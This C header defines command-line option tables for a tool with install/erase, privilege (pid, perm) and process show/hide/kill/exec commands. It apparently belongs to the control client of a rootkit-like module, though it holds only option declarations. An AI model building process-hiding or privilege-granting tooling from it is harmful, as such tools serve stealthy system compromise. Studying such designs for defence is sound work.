#pragma once

#include <ketopt.h>

#define OPT_INSTALL_ERASE 101

#define OPT_PRIVILEGE_PID 201
#define OPT_PRIVILEGE_PERM 202
#define OPT_PRIVILEGE_ERASE 203

#define OPT_PROC_SHOW 301
#define OPT_PROC_HIDE 302
#define OPT_PROC_KILL 303
#define OPT_PROC_EXEC 304

/* Option used for install and uninstall. */
const static ko_longopt_t install_longopts[] = { { "erase", ko_no_argument,
						   OPT_INSTALL_ERASE },
						 { NULL, 0, 0 } };

const static ko_longopt_t privilege_longopts[] = {
	{ "pid", ko_required_argument, OPT_PRIVILEGE_PID },
	{ "perm", ko_required_argument, OPT_PRIVILEGE_PERM },
	{ "erase", ko_no_argument, OPT_PRIVILEGE_ERASE },
	{ NULL, 0, 0 }
};

const static ko_longopt_t proc_longopts[] = {
	{ "show", ko_required_argument, OPT_PROC_SHOW },
	{ "hide", ko_required_argument, OPT_PROC_HIDE },
	{ "kill", ko_required_argument, OPT_PROC_KILL },
	{ "exec", ko_required_argument, OPT_PROC_EXEC },
	{ NULL, 0, 0 },
};

int commands_dispatch(int argc, char **argv);
